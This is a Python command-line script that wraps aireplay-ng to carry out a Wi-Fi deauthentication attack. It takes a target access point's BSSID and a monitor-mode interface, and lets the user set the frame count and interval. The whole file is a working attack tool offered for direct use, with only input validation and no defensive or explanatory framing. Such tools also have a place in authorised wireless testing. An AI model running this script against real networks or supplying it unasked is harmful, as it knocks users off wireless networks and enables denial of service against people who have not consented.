import re
import sys
import shutil
import subprocess

# Verify external tool exists
if shutil.which('aireplay-ng') is None:
    print("[!] Required tool not found: aireplay-ng. Please install aircrack-ng suite.")
    sys.exit(1)

def validate_inputs(bssid, iface, count):
    """Ensure bssid, iface, and count are properly formatted."""
    if not re.match(r'^[0-9A-Fa-f:]{17}$', bssid):
        print(f"[!] Invalid BSSID format: {bssid}")
        sys.exit(1)
    if not re.match(r'^[a-zA-Z0-9]+$', iface):
        print(f"[!] Invalid interface name: {iface}")
        sys.exit(1)
    if not isinstance(count, int) or count < 1:
        print(f"[!] Deauth count must be a positive integer, got: {count}")
        sys.exit(1)

def deauth_attack(iface, bssid, count=10, ignore_negative_one=True, interval=None):
    """
    Launch a deauthentication attack using aireplay-ng.

    :param iface: monitor-mode interface (e.g., wlan0mon)
    :param bssid: target AP BSSID
    :param count: number of deauth frames to send
    :param ignore_negative_one: use --ignore-negative-one flag if True
    :param interval: interval between frames in ms (optional)
    """
    validate_inputs(bssid, iface, count)

    cmd = ['aireplay-ng', '--deauth', str(count), '-a', bssid, iface]
    if ignore_negative_one:
        cmd.insert(1, '--ignore-negative-one')
    if interval is not None:
        if not isinstance(interval, (int, float)) or interval < 0:
            print(f"[!] Invalid interval value: {interval}")
            sys.exit(1)
        cmd.extend(['--interval', str(interval)])

    try:
        print(f"[+] Executing: {' '.join(cmd)}")
        subprocess.run(cmd, check=True)
        print("[+] Deauthentication attack completed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"[!] aireplay-ng failed (exit {e.returncode}): {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user.")
        sys.exit(0)

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description="Perform deauth attack")
    parser.add_argument('iface', help="Monitor-mode interface (e.g., wlan0mon)")
    parser.add_argument('bssid', help="Target AP BSSID")
    parser.add_argument('-c', '--count', type=int, default=10,
                        help="Number of deauth packets to send (default: 10)")
    parser.add_argument('-i', '--interval', type=float,
                        help="Interval between packets in ms")
    parser.add_argument('--no-ignore-negative-one', dest='ignore_negative_one',
                        action='store_false',
                        help="Disable --ignore-negative-one flag")
    args = parser.parse_args()

    deauth_attack(args.iface, args.bssid, count=args.count,
                  ignore_negative_one=args.ignore_negative_one,
                  interval=args.interval)